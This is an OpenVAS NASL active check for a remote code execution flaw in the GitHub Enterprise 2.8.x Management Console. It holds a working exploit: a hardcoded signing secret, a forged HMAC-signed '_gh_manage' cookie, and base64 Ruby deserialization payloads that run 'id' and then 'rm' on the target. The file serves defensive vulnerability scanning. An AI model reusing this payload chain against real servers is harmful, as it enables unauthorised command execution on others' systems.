# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:github:github_enterprise";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140196");
  script_version("2024-07-18T05:05:48+0000");
  script_tag(name:"last_modification", value:"2024-07-18 05:05:48 +0000 (Thu, 18 Jul 2024)");
  script_tag(name:"creation_date", value:"2017-03-17 17:11:03 +0100 (Fri, 17 Mar 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-03-29 15:03:00 +0000 (Fri, 29 Mar 2019)");

  script_cve_id("CVE-2017-18365");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("GitHub Enterprise 2.8.x < 2.8.7 Management Console RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_github_enterprise_http_detect.nasl");
  script_require_ports("Services/www", 8443);
  script_mandatory_keys("github/enterprise/management_console/http/detected");

  script_tag(name:"summary", value:"GitHub Enterprise suffer from a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP requests with a special crafted
  Cookie and checks the responses.");

  script_tag(name:"insight", value:"It is possible to inject arbitrary commands via modified
  cookie.");

  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary
  commands in context of the affected application.");

  script_tag(name:"affected", value:"GitHub Enterprise version 2.8.x through 2.8.6.");

  script_tag(name:"solution", value:"Update to version 2.8.7 or later.");

  script_xref(name:"URL", value:"https://enterprise.github.com/releases/2.8.7/notes");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/141653/GitHub-Enterprise-2.8.x-Remote-Code-Execution.html");
  script_xref(name:"URL", value:"https://www.exablue.de/en//blog/2017-03-15-github-enterprise-remote-code-execution.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");
include("host_details.inc");
include("misc_func.inc");
include("string_hex_func.inc");

SECRET = "641dd6454584ddabfed6342cc66281fb";

function set_file( file, dump ) {

  local_var file, dump, tmp;

  if( ! file || ! dump )
    return;

  search = "openvas_1808149858";

  tmp = base64_decode( str:dump );

  tmp = str_replace( string:tmp, find:search, replace:file );

  dump = base64( str:tmp );

  return dump;
}

function build_cookie( dump ) {

  local_var dump;

  if( ! dump )
    return;

  hmac = hexstr( HMAC_SHA1( data:dump, key:SECRET ) );
  cookie = "_gh_manage=" + urlencode( str: dump + "--" + hmac );

  return cookie;
}

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( port:port, cpe:CPE ) )
  exit( 0 );

# nb: gb_github_enterprise_http_detect.nasl is registering the dir as "/setup"
# and the final URL is / should be /setup/unlock here.
url = dir + "/unlock";
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf !~ "Set-Cookie\s*:.+" || "_gh_manage" >!< buf )
  exit( 0 );

c = eregmatch( pattern:'_gh_manage=([^\r\n; ]+)', string:buf );
if( isnull( c[1] ) )
  exit( 0 );

cookie = c[1];

s = split( cookie, sep:"--", keep:FALSE );
if( isnull( s[0] ) || isnull( s[1] ) )
  exit( 0 );

data = s[0];
data = urldecode( estr:data );
hmac = s[1];

hash = hexstr( HMAC_SHA1( data:data, key:SECRET ) );
if( hash != hmac )
  exit( 99 );

# id > ./public/openvas_1808149858
dump = 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiAAY7AFRJIgxleHBsb2l0BjsAVG86' +
       'QEFjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uOjpEZXByZWNhdGVkSW5zdGFu' +
       'Y2VWYXJpYWJsZVByb3h5CDoOQGluc3RhbmNlbzoSRXJ1YmlzOjpFcnVieQY6' +
       'CUBzcmNJIiwleHtpZCA+IC4vcHVibGljL29wZW52YXNfMTgwODE0OTg1OH07' +
       'IDEGOwBUOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsAVA==';

vt_strings = get_vt_strings();

file = vt_strings["lowercase"] + "_" + rand_str( length:10, charset:"0123456789" );
dump = set_file( file:file, dump:dump );
cookie = build_cookie( dump:dump );

req = http_get_req( port:port, url:"/", add_headers: make_array( "Cookie", cookie) );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( buf !~ "^HTTP/1\.[01] 302" )
  exit( 99 );

url = "/" + file;
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ "uid=[0-9]+.*gid=[0-9]+" ) {

  result = buf;

  # rm ./public/openvas_1808149858
  dump = 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiAAY7AFRJIgxleHBsb2l0BjsAVG86' +
         'QEFjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uOjpEZXByZWNhdGVkSW5zdGFu' +
         'Y2VWYXJpYWJsZVByb3h5CDoOQGluc3RhbmNlbzoSRXJ1YmlzOjpFcnVieQY6' +
         'CUBzcmNJIioleHtybSAuL3B1YmxpYy9vcGVudmFzXzE4MDgxNDk4NTh9OyAx' +
         'BjsAVDoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7AFQ=';

  dump = set_file( file:file, dump:dump );

  cookie = build_cookie( dump:dump );
  req = http_get_req( port:port, url:"/", add_headers:make_array( "Cookie", cookie ) );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  security_message( port:port, data:'It was possible to execute the `id` command on the remote host.\n\nResult: ' + result );
  exit( 0 );
}

exit( 99 );
